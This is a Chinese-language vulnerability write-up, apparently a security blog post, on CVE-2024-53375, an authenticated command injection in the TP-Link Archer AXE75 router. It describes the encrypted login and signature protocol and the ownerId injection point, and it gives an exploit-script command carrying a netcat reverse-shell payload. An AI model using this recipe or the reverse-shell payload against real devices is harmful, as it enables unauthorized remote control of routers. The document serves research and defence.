![60.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv18nyg6i1ia5tsgw.png)

回到正题，这里再次展示`sign`的解析程序，函数`function analyze_signature(sig, hasaeskey)`在`/luci/service.lua`下。我们知道了登录请求时`renew_aeskey`为true，我们需要在请求体的`sign`里构造签名字符串，当然这种格式在后面的请求也能用，只不过`aeskey`和`aeskiv`不会被解析。最先对`sign`做的处理是RSA解密，密钥来源于同文件的`read_rsakey()`，这个函数读取的是`form=auth`请求获得的密钥`sign_rsa_n`、`sign_rsa_e`。

![61.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv18yve9y32t9svbo.png)

构造签名字符串格式如下

```
k=<aeskey>&i=<aesiv>&h=<hash>&s=<seq>
```

看回函数`decrypt`,我们重点研究一下签名`sign`提取的数据用来做什么，`hash`前面登录逻辑分析到了，拼接"admin"和密码取哈希值，在这里登录时存储，之后比较验证。seq值减去`data`的长度后和之前发送的序列号`sign_seq`比较，我们发送的`seq`应该是`sign_seq`+`data`的长度。

![62.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv194scwp7lnutrea.png)

最后看到`data`的AES解码函数`aes_dec_data`，函数`aes_dec_data`函数的流程：

- 验证输入数据`data`和`aeskey`的有效性；

- 将`data`进行Base64解码
- 将解码后的数据写入临时文件
- 使用AES算法解密文件内容，输出到另一个临时文件
- 读取解密后的数据，清理临时文件，返回结果
- 如果任何步骤失败（输入无效、Base64解码失败、文件操作失败、解密失败等），返回nil。

到这里，我们的请求解析流程也完全清楚了

![63.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv19av0csdi9plysq.png)

### 总结

整理我们分析到的内容并倒推，和服务器通信并触发漏洞的过程如下

1. 获取签名密钥（`/login?form=auth`）： 

   - 格式：`POST http://<target>/cgi-bin/luci/;stok=/login?form=auth   {'operation': 'read'}`
   - 响应：获取 RSA 密钥（`sign_rsa_n`, `sign_rsa_e`）和序列号（`sign_seq`）。

2. 获取密码密钥（`/login?form=keys`）：
   - 格式：`POST http://<target>/cgi-bin/luci/;stok=/login?form=keys   {'operation': 'read'}`
   - 响应：获取密码 RSA 密钥（`password_rsa_n`, `password_rsa_e`）。

3. 登录请求（`/login?form=login`）：

   - 格式：`POST http://<target>/cgi-bin/luci/;stok=/login?form=login   {'sign': <encrypted_signature>, 'data': <encrypted_data>}`
   - 数据来源：
     - `encrypted_data`：
       - `post_data`： 
         - `operation`：`'login'`。
         - `password`：使用`password_rsa_n`和`password_rsa_e`RSA加密用户输入的密码
       - `post_data`序列化为URL编码字符串。
       - 使用AES加密，密钥为`self.aes_key`，初始向量为`self.aes_iv`。
       - 加密结果使用`base64.b64encode`编码为Base64格式。
     - `encrypted_signature`：
       - 签名内容：`k=<aes_key>&i=<aes_iv>&h=<password_hash>&s=<sign_seq+len(encrypted_data)>`。
         - `aes_key`和`aes_iv`：来自`self.aes_key`和`self.aes_iv`。
         - `password_hash`：对`"admin"+args.p`进行MD5哈希（`hashlib.md5`）。
         - `sign_seq`：从第一次请求获取的序列号。
       - 使用`sign_rsa_n`和`sign_rsa_e`RSA加密签名
   - 响应：提取`stok`

4. 漏洞利用请求（`/admin/smart_network?form=tmp_avira`）： 
   - 格式：`POST http://<target>/cgi-bin/luci/;stok=<stok>/admin/smart_network?form=tmp_avira   {'sign': <encrypted_signature>, 'data': <encrypted_data>}`

   - 数据来源：
     - `stok`：登录响应。
     - `encrypted_data`：
       - `operation`：`'getInsightSites'`
       - `postdata`：
         - `ownerId`：命令注入 payload。
         - `date`: `'today'`
         - `type`: `'visit'`
         - `startIndex`: `0`
         - `amount`: `1`
       - 先对`postdata`进行json编码，后续处理同登录请求

     - `encrypted_signature`：处理同登录请求

## RCE脚本执行

根据之前的分析，我们已经完全了解应该如何登录并发送请求，这里使用脚本触发漏洞，来自漏洞发现者，`-c`可以自己输入注入命令。

```
python3 1.py -t <host ip> -p <设置的axe75密码> -c "mknod /tmp/p p; nc <host ip> 4444 0</tmp/p | /bin/sh >/tmp/p 2>&1; rm -f /tmp/p"
```

效果如下

![64.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv19q2cmwmgm9fpwn.png)

![65.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv19s7m0q13sgemws.png)

## 命令注入点分析和验证输入合法性

根据本漏洞的思路，在usr/lib/lua目录下搜索lua脚本的危险函数，关键词”os.execute“、”call“、”fork“等，除漏洞点外，用户控制的参数都有严格的验证，下面举例分析。

1. ```lua
   os.execute("/sbin/switch_mode_multi %s %s >/dev/null 2>&1" %{old_mode, new_mode})
   ```

   luci/controller/admin/system.lua，漏洞函数

   ![66.png](https://www.iotsec-zone.com/api/image/v2/20250807/dbvvw5b1wiswek0et8.png)

   调用函数点，可以看到old_mode由读取系统配置获得，new_mode由http请求读取。但是new_mode做了严格的验证，只能在有限的几个模式中选择，无法注入命令
![67.png](https://www.iotsec-zone.com/api/image/v2/20250807/dbvvwpuivedmpu6geg.png)

2. ```lua
   os.execute("vpn_mgmt client del "..mac)
   ```

   luci/controller/admin/vpn.lua，漏洞函数，有mac验证

   ![68.png](https://www.iotsec-zone.com/api/image/v2/20250807/dbvvwxxs2l5tc4ynpu.png)

   找到验证点，，程序使用正则表达式匹配mac地址，确认无法注入

   ![69.png](https://www.iotsec-zone.com/api/image/v2/20250807/dbvvx4dxum47vuzmrb.png)

---

## 附录

### 参考文章

[CVE-2024-53375 TP-Link Archer router series Authenticated RCE :: Thotty](https://thottysploity.github.io/posts/cve-2024-53375/)

[ThottySploity/CVE-2024-53375: TP-Link Archer AXE75 Authenticated Command Injection](https://github.com/ThottySploity/CVE-2024-53375?tab=readme-ov-file)

[CVE-2022-30075/tplink.py at main · aaronsvk/CVE-2022-30075 · GitHub](https://github.com/aaronsvk/CVE-2022-30075/blob/main/tplink.py)
